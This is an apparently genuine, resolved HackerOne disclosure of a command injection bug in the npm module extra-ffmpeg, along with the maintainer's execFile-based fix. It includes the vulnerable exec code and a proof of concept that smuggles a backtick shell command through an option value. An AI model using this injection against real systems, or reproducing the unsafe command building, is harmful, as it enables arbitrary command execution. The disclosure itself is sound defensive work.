{
  "id": 863944,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM5NDQ=",
  "url": "https://hackerone.com/reports/863944",
  "title": "[extra-ffmpeg] Command Injection via insecure command formatting",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-01T11:15:06.209Z",
  "submitted_at": "2020-05-01T11:15:06.209Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3lla",
    "url": "/d3lla",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-08-20T09:08:41.263Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-20T09:08:41.211Z",
  "team_member_agreed_on_going_public_at": "2020-07-25T19:04:18.662Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `Command Injection` issue in the `extra-ffmpeg` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `extra-ffmpeg`\n**version:** `4.0.3`\n**npm page:** `https://www.npmjs.com/package/extra-ffmpeg`\n\n## Module Description\n\nDecode, encode, transcode, mux, demux, stream, filter, and play media through machine (via \"ffmpeg\").\n\n## Module Stats\n\n[99] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19\nconst cp = require('child_process');\n\n\n// Global variables.\nconst STDIO = [0, 1, 2];\n\n\n // Generate command for ffmpeg.\n function command(os) {\n  var z = 'ffmpeg';\n  var os = os||[];\n  for(var o of os) {\n    var o = o||{};\n    for(var k in o) {\n      if(o[k]==null) continue;\n      if(k==='stdio') continue;\n      if(k==='o' || k==='outfile') z += ` \"${o[k]}\"`;\n      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';\n      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection\n    }\n  }\n  return z;\n};\n\n/**\n * Invoke \"ffmpeg\" synchronously.\n * @param {object} os ffmpeg options.\n */\nfunction sync(os) {\n  var stdio = os.stdio===undefined? STDIO:os.stdio;\n  return cp.execSync(command(os), {stdio});\n};\n\n/**\n * Invoke \"ffmpeg\" asynchronously.\n * @param {object} os ffmpeg options.\n */\nfunction ffmpeg(os) {\n  var stdio = os.stdio===undefined? STDIO:os.stdio;\n  return new Promise((fres, frej) => cp.exec(command(os), {stdio}, (err, stdout, stderr) => {\n    if(err) frej(err);\n    else fres({stdout, stderr});\n  }));\n};\nffmpeg.sync = sync;\nmodule.exports = ffmpeg;\n```\nThe `os` parameter contains the option parameters for the command `ffmpeg`. \nThe final command that is passed to the `child_process.exec` function is built formatting the options value without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `extra-ffmpeg` module:\n    -  `npm i extra-ffmpeg`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst ffmpeg = require('extra-ffmpeg');\nffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810821}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `extra-ffmpeg` module via insecure command formatting.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 810821,
      "file_name": "poc_extra-ffmpeg.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zYRYw2z2F7JT8yUAmnv3NYsS?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-ffmpeg.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-ffmpeg.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=31c7f07d2d0f941925ba576e82de6b8fb34e443e4841bd17660bb758d4372190",
      "file_size": 4521615,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-08-24T19:04:18.884Z",
  "allow_singular_disclosure_after": -97158032.094246,
  "singular_disclosure_allowed": true,
  "vote_count": 0,
  "voters": [

  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 7864214,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@celt",
      "automated_response": false,
      "created_at": "2020-05-01T14:01:03.413Z",
      "updated_at": "2020-05-01T14:01:03.413Z",
      "actor": {
        "username": "celt",
        "cleared": false,
        "verified": false,
        "url": "/celt",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 7864234,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@celt",
      "automated_response": false,
      "created_at": "2020-05-01T14:03:19.257Z",
      "updated_at": "2020-05-01T14:03:19.257Z",
      "actor": {
        "username": "celt",
        "cleared": false,
        "verified": false,
        "url": "/celt",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736034,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2020-07-24T07:00:03.000Z",
      "updated_at": "2020-07-24T07:00:03.000Z",
      "actor": {
        "username": "wolfram77",
        "cleared": false,
        "verified": false,
        "url": "/wolfram77",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736563,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Here is the output now, looks it should not be accepting commands now. Used `execFile` as you suggested. Maybe it looks like spoon feeding, but could you tell how you found this particular packages has this bug? Thanks for what you do.\n\n```bash\n> var ffmpeg = require('./')\nundefined\n> ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);\nffmpeg version 4.0.2 Copyright (c) 2000-2018 the FFmpeg developers\n  built with gcc 7.3.1 (GCC) 20180722\n  configuration: --disable-static --enable-shared --enable-gpl --enable-version3 --enable-sdl2 --enable-bzlib --enable-fontconfig --enable-gnutls --enable-iconv --enable-libass --enable-libbluray --enable-libfreetype --enable-libmp3lame --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopenjpeg --enable-libopus --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libtheora --enable-libtwolame --enable-libvpx --enable-libwavpack --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libzimg --enable-lzma --enable-zlib --enable-gmp --enable-libvidstab --enable-libvorbis --enable-libvo-amrwbenc --enable-libmysofa --enable-libspeex --enable-libxvid --enable-libaom --enable-libmfx --enable-amf --enable-ffnvcodec --enable-cuvid --enable-d3d11va --enable-nvenc --enable-nvdec --enable-dxva2 --enable-avisynth\n  libavutil      56. 14.100 / 56. 14.100\n  libavcodec     58. 18.100 / 58. 18.100\n  libavformat    58. 12.100 / 58. 12.100\n  libavdevice    58.  3.100 / 58.  3.100\n  libavfilter     7. 16.100 /  7. 16.100\n  libswscale      5.  1.100 /  5.  1.100\n  libswresample   3.  1.100 /  3.  1.100\n  libpostproc    55.  1.100 / 55.  1.100\n`touch HACKED`: No such file or directory\nThrown:\nError: Command failed: ffmpeg -y -i `touch HACKED` -acodec copy aud.mp3\n    at checkExecSyncError (child_process.js:621:11)\n    at Object.execFileSync (child_process.js:639:15)\n    at Function.sync (C:\\Base\\Forge\\extra-ffmpeg\\index.js:30:13) {\n  status: 1,\n  signal: null,\n  output: [ null, null, null ],\n  pid: 30624,\n  stdout: null,\n  stderr: null\n}\n```",
      "automated_response": false,
      "created_at": "2020-07-24T08:04:59.799Z",
      "updated_at": "2020-07-24T08:04:59.799Z",
      "actor": {
        "username": "wolfram77",
        "cleared": false,
        "verified": false,
        "url": "/wolfram77",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736574,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Wanted to share the fixed code here:\n\n```javascript\n// Generate command for ffmpeg.\nfunction command(os) {\n  var file = 'ffmpeg', args = [];\n  for(var o of os||[]) {\n    for(var k in o||{}) {\n      if(o[k]==null) continue;\n      if(k==='stdio') continue;\n      if(k==='o' || k==='outfile') args.push(o[k]);\n      else if(typeof o[k]==='boolean' && o[k]) args.push('-'+k);\n      else args.push('-'+k, ''+o[k]);\n    }\n  }\n  return {file, args};\n}\n\n/**\n * Invoke \"ffmpeg\" synchronously.\n * @param {object} os ffmpeg options.\n */\nfunction sync(os) {\n  var stdio = os.stdio===undefined? STDIO:os.stdio;\n  var {file, args} = command(os);\n  return cp.execFileSync(file, args, {stdio});\n}\n```",
      "automated_response": false,
      "created_at": "2020-07-24T08:06:45.128Z",
      "updated_at": "2020-07-24T08:06:45.128Z",
      "actor": {
        "username": "wolfram77",
        "cleared": false,
        "verified": false,
        "url": "/wolfram77",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8750105,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @wolfram77,\nthanks for your reply and for the fix.\n\nYour changes seems to fix the problem.\nI run the previous poc:\n```javascript\nconst ffmpeg = require('extra-ffmpeg');\nffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);\n```\nand I was not able to reproduce the previous reported result.\n\nWhen I found this repository, since it's calling an external program (`ffmpeg`), I checked which function is used and how the command was build. Then I did some manual tests and found the issue.\nA resource that could be helpful: [Avoid-Command-Injection-Node.md](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b).\n\nThanks for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n",
      "automated_response": false,
      "created_at": "2020-07-25T07:36:30.579Z",
      "updated_at": "2020-07-25T07:36:30.579Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8753554,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2020-07-25T19:04:03.017Z",
      "updated_at": "2020-07-25T19:04:03.017Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "d3lla",
        "url": "/d3lla"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8753555,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-07-25T19:04:18.701Z",
      "updated_at": "2020-07-25T19:04:18.701Z",
      "first_to_agree": true,
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8986443,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-20T09:08:41.235Z",
      "updated_at": "2020-08-20T09:08:41.235Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8986444,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-20T09:08:41.285Z",
      "updated_at": "2020-08-20T09:08:41.285Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}